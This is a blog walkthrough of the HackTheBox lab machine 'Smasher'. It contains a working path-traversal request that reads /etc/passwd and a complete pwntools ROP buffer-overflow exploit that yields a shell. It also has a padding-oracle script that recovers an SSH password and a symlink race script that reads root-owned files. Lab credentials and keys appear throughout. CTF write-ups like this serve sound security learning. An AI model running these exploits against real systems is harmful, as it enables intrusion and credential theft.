---
title: HTB: Smasher
url: https://0xdf.gitlab.io/2018/11/24/htb-smasher.html
date: 2018-11-24T11:00:30+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-smasher, bof, pwntools, timing-attack, padding-oracle, aes, directory-traversal
---

![](https://0xdfimages.gitlab.io/img/smasher-cover.png) Smasher is a really hard box with three challenges that require a detailed understanding of how the code you’re intereacting with works. It starts with an instance of shenfeng tiny-web-server running on port 1111. I’ll use a path traversal vulnerability to access to the root file system. I’ll use that to get a copy of the source and binary for the running web server. With that, I’ll write a buffer overflow exploit to get a reverse shell. Next, I’ll exploit a padding oracle vulnerability to get a copy of the smasher user’s password. From there, I’ll take advantage of a timing vulnerability in setuid binary to read the contents of root.txt. I think it’s possible to get a root shell exploiting a buffer overflow, but I wasn’t able to pull it off (yet). In Beyond Root, I’ll check out the AES script, and show how I patched the checker binary.

## Box Info

| Name | [Smasher](https://hackthebox.com/machines/smasher)  [Smasher](https://hackthebox.com/machines/smasher) [Play on HackTheBox](https://hackthebox.com/machines/smasher) |
| --- | --- |
| Release Date | 09 Jun 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Smasher |
| Radar Graph | Radar chart for Smasher |
| First Blood User | 16:05:55[dm0n dm0n](https://app.hackthebox.com/users/2508) |
| First Blood Root | 17:36:35[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| Creator | [dzonerzy dzonerzy](https://app.hackthebox.com/users/1963) |

## Recon

### nmap

Two ports open, ssh and TCP 1111:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.89
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-12 08:45 EDT
Nmap scan report for 10.10.10.89
Host is up (0.100s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver

Nmap done: 1 IP address (1 host up) scanned in 18.95 seconds

root@kali# nmap -sC -sV -oA nmap/initial 10.10.10.89
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-12 08:48 EDT
Nmap scan report for 10.10.10.89
Host is up (0.099s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)
|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)
|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)
1111/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.14 seconds

```

The box looks like [Ubuntu Xenial](https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.4), based on the SSH version.

### TCP 1111: HTTP Tiny Web Server

#### Site

While nmap didn’t identify what was happening on 1111, that port is hosting a webserver:

![1528810165700](https://0xdfimages.gitlab.io/img/1528810165700.png)

Going to `index.html` gives a login:

![1528810199434](https://0xdfimages.gitlab.io/img/1528810199434.png)

It is interesting to note that going to the root gives a dir listing, despite the fact that index.html is present in that directory. On typical webserver, by convention, the default settings would have index.html load in that case.

#### gobuster

`gobuster` turned up nothing:

```

root@kali# gobuster -u http://10.10.10.89:1111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.89:1111/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
[+] Extensions   : .txt,.html,.js,.php
=====================================================
/index.html (Status: 200)

```

#### HTTP Headers

Going back to look at the server http headers, there’s something interesting. The headers for `/index.html` are pretty boring:

```

HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Content-length: 2168
Content-type: text/html

```

But the Server header for the root path `/` show that this is the “shenfeng tiny-web-server”:

```

HTTP/1.1 200 OK
Server: shenfeng tiny-web-server
Content-Type: text/html

```

## Tiny Web Server Exploit - Path Traversal

That software is [open source](https://github.com/shenfeng/tiny-web-server), and one of the open [issues](https://github.com/shenfeng/tiny-web-server/issues/2) on GitHub is that the server allows for file reads outside of the www root directory. Also, it does directory listings, so the reason we see the link to `index.html` when we visit just the web root is that that’s the only file in that directory.

### POC - nc

Testing the directory traversal on smasher with `nc`:

```

root@kali# nc 10.10.10.89 1111
GET /../../../../../etc/passwd HTTP/1.0

HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Content-length: 1508
Content-type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...[snip]...
www:x:1000:1000:www,,,:/home/www:/bin/bash
smasher:x:1001:1001:,,,:/home/smasher:/bin/bash

```

### POC - curl

As shown above, `nc` works to do the path traversal. By default, `curl` will fix paths with directory traversal and remove the `../`. However, if I use the `--path-as-is` flag, I can get what I’m looking for here. From the man pages:

> –path-as-is Tell curl to not handle sequences of /../ or /./
> ​ in the given URL path. Normally curl will squash
> ​ or merge them according to standards but with
> ​ this option set you tell it not to do that.

```

root@kali# curl --path-as-is http://10.10.10.89:1111/../../../../etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

```

## Tiny Web Server Exploit - BOF to Shell

### Download

In exploring the box with the directory traversal vulnerability, I didn’t much too much interesting, except access to the webserver itself. And, given the name of the box, it seems I should be looking for a buffer overflow.

In the dir above the web-root, I’ll find both the binary and the source code for the webserver:

![1529714442001](https://0xdfimages.gitlab.io/img/1529714442001.png)

I’ll grab both (`-O` in `curl` is to save the file to the same name as the file on the server, whereas `-o` has you provide a filename):

```

root@kali# curl -s --path-as-is "10.10.10.89:1111/../tiny.c" -O
root@kali# curl -s --path-as-is "10.10.10.89:1111/../tiny" -O

```

### Exploitation

I used access to the binary and source to develop an exploit against `tiny`. If you’re interested in the details, check out the [next post](/2018/11/24/htb-smasher-bof.html) which walks through exactly how I built this script. Here’s the final product:

```

#/usr/bin/env python

from pwn import *
from urllib import quote as urlencode

# Set up context
elf = context.binary = ELF('tiny/tiny', checksec=False)
#HOST, PORT = "127.0.0.1", 1111
HOST, PORT = "10.10.10.89", 1111

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {:02x}".format(BSS))
read = elf.plt.read
log.info("plt read address: {:02x}".format(read))

# Build Payload
junk =  "A" * 568                  # junk
payload = ''
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode

req = r'GET {}'.format(urlencode(junk + payload))

# Send request
r = remote(HOST, PORT)
r.sendline(req)
r.sendline('')
r.recvuntil('File not found')
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))
r.interactive()

```

And, it gives me a shell:

```

root@kali# python tiny_exploit.py
[*] BSS address: 603260
[*] plt read address: 400cf0
[*] payload: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%dd%11%40%00%00%00%00%00%04%00%00%00%00%00%00%00%db%11%40%00%00%00%00%00%60%32%60%00%00%00%00%00%60%32%60%00%00%00%00%00%f0%0c%40%00%00%00%00%00%60%32%60%00%00%00%00%00
[+] Opening connection to 10.10.10.89 on port 1111: Done
[*] Switching to interactive mode
$ id
uid=1000(www) gid=1000(www) groups=1000(www)

```
*July 2023 Note: Getting this exact script to work in modern Python will take some work. If you choose to go with Python2, you may need to [freeze unicorn](https://github.com/Gallopsled/pwntools/issues/1538) at version 1.0.2rc6. to make `pwntools` work as expected. Thanks to InvertedClimbing for the tip*

## AES Checker - Privesc: www –> smasher

### Enumeration

As www, I noticed a couple interesting running processes:

```

root       709  0.0  0.3  54816  3804 ?        S    Jun26   0:00 sudo -u smasher /home/smasher/socat.sh
smasher    730  0.0  0.3  24364  3084 ?        S    Jun26   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py

```

That is the smasher user using `socat` to serve `crackme.py` on localhost port 1337.

### crackme.py

Since it’s only bound locally, I’ll connect from my shell:

```

$ nc 127.0.0.1 1337
[*] Welcome to AES Checker! (type 'exit' to quit)
[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Insert ciphertext:

```

At first I was trying to give it passwords, but really, it’s asking for ciphertext.

```

$ nc 127.0.0.1 1337
[*] Welcome to AES Checker! (type 'exit' to quit)
[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Insert ciphertext: $ password
Generic error, ignore me!
Insert ciphertext: $ smasher
Generic error, ignore me!
Insert ciphertext: $ irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Hash is OK!
Insert ciphertext: $ irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=
Generic error, ignore me!
Insert ciphertext: $ irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXda==
Invalid Padding!

```

Generic plain text gives “Generic error, ignore me!”. Sending the hash back returns “Hash is OK!”. Shortening the base64 padding also gives “Generic error, ignore me!”, but changing the last letter of the base64 from `g` to `a` gives “Invalid Padding!”.

### Padding Oracle Attack

Anytime there is an error message for a padding error, it is worth considering a [padding oracle attack](https://en.wikipedia.org/wiki/Padding_oracle_attack). For a details primer, [this](https://robertheaton.com/2013/07/29/padding-oracle-attack/) is a good read.

A padding oracle attack is an attack against block ciphers where you have something (“an oracle”) that will respond to tell you if that padding on the cipher text is correct or not. It is important that there is a different error for a padding error than for an incorrect or invalid decryption. The most common case for this kind of thing is when you get an encrypted cookie in a web session, but there’s no reason we can’t do it here with this command line program.

For block ciphers, the message will not always divide evenly by the block length. To get a full final block, typically padding is used. [PKCS7](https://en.wikipedia.org/wiki/PKCS) offers a padding scheme where the value of the pd bytes is equal to the number of padding bytes. That allows for disambiguation between padding bytes and true message bytes.

The attack takes advantage of the fact that to decrypt a block, the cipher text is xored with the key to form the intermediate state. Then the intermediate state is xored with the previous block cipher text to get the plain text. This attack will allow me to find the intermediate state, and then, with that, it can find the plaintext.

### Adding to Exploit Script

Since I already have a python script going, I’ll add to it the ability to crack this encrypted text.

First, I’ll a chance to bail out in case I want a www shell:

```

## Shell or AES
if (raw_input("Type 'shell' for shell, anything else to continue\n> ").strip() == 'shell'):
    r.interactive()
    sys.exit()

```

Next, connect to the listening service and get the data:

```

log.info('Connecting to 127.0.0.1 1337 for AES challenge')
r.sendline('nc 127.0.0.1 1337')
r.recvuntil('[!] Crack this one: ')
data = r.recvline(keepends = False)
log.info('data: {}'.format(data))

encdata = b64decode(data)
log.info("data is {} bytes long, {} blocks".format(len(encdata), len(encdata)//AES.block_size))
iv = encdata[:16]
encdata = encdata[16:]

```

Next, I’ll import a module from mwielgoszewski designed to implement padding oracle attacks, [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle). With this module, you simply pass it a socket, implement the `oracle()` function, and raise a `BadPaddingException` when there’s bad padding, and it handles the rest.

My code looks like this:

```

class PadBuster(PaddingOracle):
    def __init__(self, pwnsock, **kwargs):
        self.r = pwnsock
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        if all([x == 0 for x in data[:15]]) and data[16] == 255:
            print('\n\n\n\n')
        os.write(1, "\x1b[3F")
        print(hexdump(data))
        self.r.recvuntil('Insert ciphertext:')
        self.r.sendline(b64encode(data))
        resp = self.r.recvline()
        if 'Invalid Padding' in resp:
            raise BadPaddingException()
        return

log.info('Starting padding oracle attack')
pb = PadBuster(r)
plaintext = pb.decrypt(encdata, block_size=AES.block_size, iv=iv)
print('plaintext: {}'.format(plaintext))
r.close()

```

I will pass the open `pwn` socket in on init, and the in the oracle function, receive until the prompt, then send data, then receive the response. If it says “Invalid Padding”, I raise the exception, or, otherwise, return nothing.

### Status Printing Tricks

This attack takes a while, so I added the part at the start to print the hexdump of the data that `paddingoracle` is trying to send. It ends up that one byte changes each time, until it gets the right byte and then moves to the next byte. I didn’t want 1000s of lines printed, but I wanted to see where things were. This was a good chance to learn about [CSI codes](https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_codes). By printing “\x1b[nf”, it tells the console to go back to the beginning of the current line and then up n-1 lines (if n > 1). So I can print the current hexdump over itself repeatedly, getting status, without crushing space.

### Final Script

```

#/usr/bin/env python

import logging
import os
import re
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from pwn import *
from paddingoracle import BadPaddingException, PaddingOracle
from urllib import quote as urlencode

## Get Shell on Smasher

# Set up context
elf = context.binary = ELF('tiny/tiny', checksec=False)
#HOST, PORT = "127.0.0.1", 1111
HOST, PORT = "10.10.10.89", 1111

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {:02x}".format(BSS))
read = elf.plt.read
log.info("plt read address: {:02x}".format(read))

# Build Payload
junk =  "A" * 568                  # junk
payload = ''
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode

req = r'GET {}'.format(urlencode(junk + payload))

# Send request
while True:
    r = remote(HOST, PORT)
    r.sendline(req)
    r.sendline('')
    r.recvuntil('File not found', timeout=3)
    r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))
    r.sendline('whoami')
    who = r.recv()
    if who:
        log.success('Shell on {} as {}'.format(HOST, who))
        break
    log.warn('Failed to get shell. Retrying')
    r.close()

## Shell or AES
if (raw_input("Type 'shell' for shell, anything else to continue\n> ").strip() == 'shell'):                    
    r.interactive()
    sys.exit()

## AES Challenge - padding oracle attack
print("")
log.info('Connecting to 127.0.0.1 1337 for AES challenge')
r.sendline('nc 127.0.0.1 1337')
r.recvuntil('[!] Crack this one: ')
data = r.recvline(keepends = False)
log.info('data: {}'.format(data))

encdata = b64decode(data)
log.info("data is {} bytes long, {} blocks".format(len(encdata), len(encdata)//AES.block_size))
log.info("Attack Buffer:")
print('\n')

class PadBuster(PaddingOracle):
    def __init__(self, pwnsock, **kwargs):
        self.r = pwnsock
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        os.write(1, "\x1b[3F")
        print(hexdump(data))
        self.r.recvuntil('Insert ciphertext:')
        self.r.sendline(b64encode(data))
        resp = self.r.recvline()
        if 'Invalid Padding' in resp:
            raise BadPaddingException()
        return

log.info('Starting padding oracle attack')
pb = PadBuster(r)
plaintext = pb.decrypt(encdata, block_size=AES.block_size)             
print('plaintext: {}'.format(plaintext))
r.close()   

```

On running the final script, it returns the decrypted plaintext:

```

root@kali# python tiny_exploit.py
[*] BSS address: 603260
[*] plt read address: 400cf0
[*] payload: A..A%dd%11%40%00%00%00%00%00%04%00%00%00%00%00%00%00%db%11%40%00%00%00%00%00%60%32%60%00%00%00%00%00%60%32%60%00%00%00%00%00%f0%0c%40%00%00%00%00%00%60%32%60%00%00%00%00%00
[+] Opening connection to 10.10.10.89 on port 1111: Done
[+] Shell on 10.10.10.89 as www
Type 'shell' for shell, anything else to continue
>

[*] Connecting to 127.0.0.1 1337 for AES challenge
[*] data: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
[*] data is 64 bytes long, 4 blocks
[*] Attack Buffer:
00000000  ba 30 89 72  ff 9c 1f e5  5b 2c 55 ac  ed 23 c7 75  │·0·r│····│[,U·│·#·u│
00000010  a3 a8 52 a3  ab 68 82 a2  d8 21 31 86  a4 fb 17 76  │··R·│·h··│·!1·│···v│
00000020
plaintext:  user 'smasher' is: PaddingOracleMaster123\x06\x06\x06\x06\x06\x06
[*] Closed connection to 10.10.10.89 port 1111

```

One thing to note is that the string is returned with it’s padding, which is six bytes of 0x06.

Another thing to note - the first block didn’t decrypt. It’s not exactly clear to me if that’s a function of not knowing the IV, or if I scripted something wrong. But I’ll play with the `crackme.py` script a bit in [Beyond Root](#inside-crackmepy), and the start to the string is missing above (if you know why, leave a comment). That said, I still have the password, so I can move on.

If you watch the script run, you’ll see the script showing the cipher text, which in this case is two blocks. The second block isn’t changing. But the first block starts at all `00` except for the last byte `FF`, and it decrements that byte until it doesn’t get a padding error. Then, since it knows what the plain text should be in that case, it knows what the intermediate value for that byte is. But since it knows the intermediate value and the actual cipher text for the previous block, it can get the true plain text for that byte. Here’s a video of the cracking (a sample from the middle, as it takes a long time):

![](https://0xdfimages.gitlab.io/img/smasher-aes.gif)

## Smasher Shell - user.txt

Taking the decrypted string as a password, I can now `su` as smasher from a shell. The user flag is in the homedir:

```

smasher@smasher:~$ wc -c user.txt
33 user.txt
smasher@smasher:~$ cat user.txt
baabc5e4...

```

## Privesc to root (read)

### Enumeration

Armed with smasher’s password, we can now ssh into the host:

```

root@kali# cat smasher.pass; cat smasher.pass | xclip; ssh smasher@10.10.10.89
PaddingOracleMaster123
smasher@10.10.10.89's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Jun 28 16:42:53 2018 from 10.10.14.20
smasher@smasher:~$ id
uid=1001(smasher) gid=1001(smasher) groups=1001(smasher)

```

On enumerating the box, I found a binary that has suid permissions and seems unique to this host:

```

smasher@smasher:~$ ls -l /usr/bin/checker
-rwsr-xr-x 1 root root 13616 Apr  4 11:40 /usr/bin/checker

smasher@smasher:~$ strings -n 35 /usr/bin/checker
You're not 'smasher' user please level up bro!
[+] Welcome to file UID checker 0.1 by dzonerzy
Access failed , you don't have permission!
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
__do_global_dtors_aux_fini_array_entry

smasher@smasher:~$ /usr/bin/checker
[+] Welcome to file UID checker 0.1 by dzonerzy

Missing arguments

smasher@smasher:~$ /usr/bin/checker /usr/bin/checker
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 0

Data:
ELF

smasher@smasher:~$ echo test > /tmp/test

smasher@smasher:~$ /usr/bin/checker /tmp/test
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
test

```

Cool. This is definitely interesting.

### Analysis of checker

`IdaPro` (free 7.0 version) gives a nice image as to the flow of this simple program:

![1530206073201](https://0xdfimages.gitlab.io/img/1530206073201.png)

The program does the following:
1. Check uid and compares it to 0x3e9 (1001, which is smasher on smasher). If it isn’t smasher, it prints the string we saw in the `strings` output, “You’re not ‘smasher’ user please level up bro!” and exits.
2. Prints welcome message “[+] Welcome to file UID checker 0.1 by dzonerzy”.
3. Checks that the number of arguments passed in was 1 or more. If not, prints “Missing arguments” and exits.
4. `malloc` space for a stat buffer, and calls stat on the the first argument passed to the program. If the file doesn’t exist, it prints a message and exits.
5. Calls `access` on the the file. If the current user doesn’t have permissions, it prints an error and exits.
6. Calls `setuid(0)` and `setgid(0)` to start acting as root.
7. `sleep` for 1 second
8. Calls it’s own function `ReadFile`, which reads the content of the file into space on the heap and returns the address.
9. Calls `strcpy` to copy from that buffer to a new local variable on the stack.
10. Uses `printf` to print the file uid from the `stat` call and then the data from the file (as far as `strcpy` would copy).

### Exploiting checker

The one second sleep in the program presents an opportunity. The script is designed to not let the user read files smasher shouldn’t have access to. But that 1 seconds sleep happens between the access check and the file read. That’s something I can exploit.

I’ll use a bash script:

```

#!/bin/sh

rm -rf file
touch file
checker file &
sleep 0.5
rm file
ln -s $1 file

```

The script removes the file (or link) named `file` and then recreates it empty so that the current user is able to read. Then it runs `checker` on the file, running in the background (`&`) so that the script will continue. The script then sleeps for half a second, before removing the file, and replacing it with a symbolic link referencing a file passed in as an argument.

At this point, `checker` should be coming out of it’s sleep, where it will open the file and read it, and print the results.

```

smasher@smasher:/tmp$ bash .b.sh /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
077af136...

```
*July 2023 Update: It seems that something has changed on the box (potentially in the 2022 [update](https://app.hackthebox.com/machines/smasher/changelog) to the box) and now this script doesn’t work when run from `/tmp` or `/dev/shm`. I am still able to run it from `/home/smasher` and other directories on the host. In fact, the script can be in `/tmp`, just make sure it’s not the working directory when executing it.*

```

smasher@smasher:~$ ./a.sh /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
17076320d78e589c6b1541d1e3429aae

smasher@smasher:~$ cp a.sh /tmp/
smasher@smasher:~$ /tmp/a.sh /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
17076320d78e589c6b1541d1e3429aae

smasher@smasher:~$ cd /tmp/
smasher@smasher:/tmp$ ./a.sh /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

```

## Note About root Shell

There’s a buffer overflow in checker as well. It is immediately apparent if I try to read a longer file:

```

smasher@smasher:/tmp$ checker /etc/passwd
[+] Welcome to file UID checker 0.1 by dzonerzy

Segmentation fault

```

It turns out that there’s a boundless read of the file into a buffer on the stack. If our file is longer than 552 bytes, we’ll overwrite RIP. I suspect you can get a root shell from this, but I didn’t have time to get it worked out. ASLR is the biggest issue here. I’m excited to see if anyone else pushes a writeup with a root shell (if you know of one, leave a comment).

## Beyond Root

### Inside crackme.py

As smasher, I’m able to grab the source for `crackme.py`:

```

from Crypto.Cipher import AES                          
import base64                            
import sys                                                                         
import os

unbuffered = os.fdopen(sys.stdout.fileno(), 'w', 0)                

def w(text):                                           
    unbuffered.write(text+"\n")          
                                                                                   
class InvalidPadding(Exception):                                                   
    pass                                 
                                         
def validate_padding(padded_text):                     
    return all([n == padded_text[-1] for n in padded_text[-ord(padded_text[-1]):]])

def pkcs7_pad(text, BLOCK_SIZE=16):      
    length = BLOCK_SIZE - (len(text) % BLOCK_SIZE)                                 
    text += chr(length) * length                       
    return text
                                                       
def pkcs7_depad(text):                   
    if not validate_padding(text):       
        raise InvalidPadding()           
    return text[:-ord(text[-1])]

def encrypt(plaintext, key):             
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)     
    padded_text = pkcs7_pad(plaintext)   
    ciphertext = cipher.encrypt(padded_text)           
    return base64.b64encode(ciphertext)

def decrypt(ciphertext, key):                          
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)     
    padded_text = cipher.decrypt(base64.b64decode(ciphertext))     
    plaintext = pkcs7_depad(padded_text)               
    return plaintext

w("[*] Welcome to AES Checker! (type 'exit' to quit)") 
w("[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==")
while True:                                            
    unbuffered.write("Insert ciphertext: ")            
    try:                                               
        aes_hash = raw_input()                         
    except:                                            
        break                                                      
    if aes_hash == "exit":                                         
        break                                                      
    try:                                                           
        decrypt(aes_hash, "Th1sCh4llang31SInsane!!!")              
        w("Hash is OK!")                                           
    except InvalidPadding:                                         
        w("Invalid Padding!")                                      
    except:                                                        
        w("Generic error, ignore me!")    

```

The code prints the ciphertext (base64 encoded), reads input, and decrypted that input using the passphrase “Th1sCh4llang31SInsane!!!”. If it succeeds, it prints “Hash is OK!”. If there’s a padding error, it prints “Invalid Padding!”, and any other error it prints “Generic error, ignore me!”.

One thing that jumped out at me is that the encryption function isn’t ever called. But, I can just jump in with the python debugger, `pdb`, and check it out.

To start a python script with `pdb`, just run `python -mpdb [script]`. Inside pdb, you can use `l [line #]` to list code at a line, `n` to step forward, `c` to continue, `b [line #]` to set break points. You can also enter `![python command]` to run a command, including interacting with variables and functions.

I’ll start it up and break after all the functions are defined:

```

smasher@smasher:~$ python -mpdb crackme.py 
> /home/smasher/crackme.py(1)<module>()
-> from Crypto.Cipher import AES
(Pdb) l 44
 39         padded_text = cipher.decrypt(base64.b64decode(ciphertext))
 40         plaintext = pkcs7_depad(padded_text)
 41         return plaintext
 42  
 43  
 44     w("[*] Welcome to AES Checker! (type 'exit' to quit)")
 45     w("[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==")
 46     while True:
 47         unbuffered.write("Insert ciphertext: ")
 48         try:
 49             aes_hash = raw_input()
(Pdb) b 44
Breakpoint 1 at /home/smasher/crackme.py:44
(Pdb) c
> /home/smasher/crackme.py(44)<module>()
-> w("[*] Welcome to AES Checker! (type 'exit' to quit)")

```

I can decrypted the string, and see that I was actually not decrypting the first block with my attack:

```

(Pdb) !decrypt("irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==", "Th1sCh4llang31SInsane!!!")
"SSH password for user 'smasher' is: PaddingOracleMaster123"

```

I can check that the `encrypt` function was likely used to make the hardcoded encrypted string:

```

(Pdb) !encrypt("SSH password for user 'smasher' is: PaddingOracleMaster123", "Th1sCh4llang31SInsane!!!") == "irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=="
True

```

### Debugging - Patching checker

It’s possible to understand checker statically using Ida. Still, it’s nice to be able to run it through `gdb` and debug it. However, locally, my user isn’t uid 1001. I’ll show how I’ll quickly patch the binary so that I can run without having to worry about that check.

Start by finding the check for 1001 = 0x3e9:

```

root@kali# objdump -M intel -d  checker | grep -A1 3e9
  400a98:       3d e9 03 00 00          cmp    eax,0x3e9
  400a9d:       74 14                   je     400ab3 <main+0x38>

```

There’s an infinite number of ways to do this, but I’ll replace the `je` with a `jne`. I’ll make a copy of checker and then open in `hexcurse`:

```

root@kali# cp checker checker-patch
root@kali# hexcurse checker-patch

```

It looks like this:

```

┌00000000────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐↑┌─────────────────────────────────────────────┐
│00000000 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3E 00 01 00 00 00 B0 08 40 00 00 00 00 00 40 00 00 00 00 00 00 00 70 2D 00 00 00 │◆│.ELF..............>.......@.....@.......p-...│
│0000002D 00 00 00 00 00 00 00 40 00 38 00 09 00 40 00 1F 00 1C 00 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00 40 00 40 00 00 00 00 00 40 00 │▒│.......@.8...@.............@.......@.@.....@.│
│0000005A 40 00 00 00 00 00 F8 01 00 00 00 00 00 00 F8 01 00 00 00 00 00 00 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00 38 02 00 00 00 00 00 │▒│@.....................................8......│
│00000087 00 38 02 40 00 00 00 00 00 38 02 40 00 00 00 00 00 1C 00 00 00 00 00 00 00 1C 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00 │▒│.8.@.....8.@.................................│
│000000B4 05 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 B4 0E 00 00 00 00 00 00 B4 0E 00 00 00 00 00 00 00 │▒│..............@.......@......................│
